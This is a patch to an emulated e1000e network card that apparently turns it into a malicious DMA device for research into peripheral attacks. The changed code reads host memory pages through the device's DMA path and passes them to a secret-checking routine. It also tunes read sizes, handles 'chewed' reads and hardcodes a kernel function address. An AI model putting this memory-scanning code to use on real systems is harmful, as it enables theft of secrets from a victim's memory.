@@ -1020,7 +1020,7 @@ start_xmit(E1000ECore *core, const E1000E_TxRing *txr)
     while (!_e1000e_ring_empty(core, txi)) {
         base = _e1000e_ring_head_descr(core, txi);
 
-        pci_dma_read(core->owner, base, &desc, sizeof(desc));
+        WARN_ON_CHEW(pci_dma_read(core->owner, base, &desc, sizeof(desc)));
 
         trace_e1000e_tx_descr((void *)(intptr_t)desc.buffer_addr,
                               desc.lower.data, desc.upper.data);
@@ -1697,7 +1697,7 @@ _e1000e_write_paket_to_guest(E1000ECore *core, struct NetRxPkt *pkt,
 
         base = _e1000e_ring_head_descr(core, rxi);
 
-        pci_dma_read(d, base, &desc, core->rx_desc_len);
+        WARN_ON_CHEW(pci_dma_read(d, base, &desc, core->rx_desc_len));
 
         trace_e1000e_rx_descr(rxi->idx, base, core->rx_desc_len);
 
@@ -2665,12 +2665,13 @@ set_tdt(E1000ECore *core, int index, uint32_t val)
 
     core->mac[index] = val & 0xffff;
 
-	PDBG("Sending from ring: %d", _e1000e_mq_queue_idx(TDT, index));
+	/*PDBG("Sending from ring: %d", _e1000e_mq_queue_idx(TDT, index));*/
 	/*print_tx_buffer_address_information(core);*/
-	record_windows(core);
 
     _e1000e_tx_ring_init(core, &txr, _e1000e_mq_queue_idx(TDT, index));
     start_xmit(core, &txr);
+
+	/*record_windows(core);*/
 }
 
 static void
@@ -3716,7 +3717,7 @@ get_buffer_address_from_rx_descriptor(E1000ECore *core,
 {
     uint8_t desc[E1000_MAX_RX_DESC_LEN];
     hwaddr ba[MAX_PS_BUFFERS]; /* Buffer addresses */
-	pci_dma_read(core->owner, rx_descriptor_addr, &desc, core->rx_desc_len);
+	WARN_ON_CHEW(pci_dma_read(core->owner, rx_descriptor_addr, &desc, core->rx_desc_len));
 	read_rx_descriptor(core, desc, &ba);
 	return ba[0];
 }
@@ -3815,10 +3816,11 @@ check_for_secret(uint64_t page_address, uint8_t page[4096])
 void
 record_windows_from_buffer_address(hwaddr ba, void *opaque)
 {
+#define PAGE_AMOUNT_TO_READ 128
 	E1000ECore *core = (E1000ECore *)opaque;
 	struct mbuf mbuf_buffer;
 	struct PageListEntry *entry, *next;
-	uint8_t page[4096];
+	uint8_t page[PAGE_AMOUNT_TO_READ];
 	int read_result;
 
 	uint64_t page_address = ba & ~uint64_mask(12);
@@ -3835,7 +3837,7 @@ record_windows_from_buffer_address(hwaddr ba, void *opaque)
 
 	while (check_head && entry != NULL) {
 		check_head = false;
-		read_result = perform_dma_long_read(page, 4096,
+		read_result = perform_dma_long_read(page, PAGE_AMOUNT_TO_READ,
 			core->owner->devfn, 8, entry->page_address);
 		if (read_result == 0) {
 			check_for_secret(entry->page_address, page);
@@ -3850,9 +3852,12 @@ record_windows_from_buffer_address(hwaddr ba, void *opaque)
 	}
 
 	while ((entry != NULL) && (next = SLIST_NEXT(entry, page_list)) != NULL) {
-		read_result = perform_dma_long_read(page, 4096,
+		read_result = perform_dma_long_read(page, PAGE_AMOUNT_TO_READ,
 			core->owner->devfn, 8, next->page_address);
-		if (read_result == 0) {
+		if (read_result != DRR_UNSUPPORTED_REQUEST) {
+			if (read_result == DRR_CHEWED) {
+				PDBG("chewed!");
+			}
 			check_for_secret(next->page_address, page);
 			entry = next;
 		} else {
@@ -3862,6 +3867,7 @@ record_windows_from_buffer_address(hwaddr ba, void *opaque)
 			free(entry);
 		}
 	}
+#undef PAGE_AMOUNT_TO_READ
 }
 
 const void *KERNEL_PRINTF_ADDR = 	(void *)0xffffffff80a4da90ll;
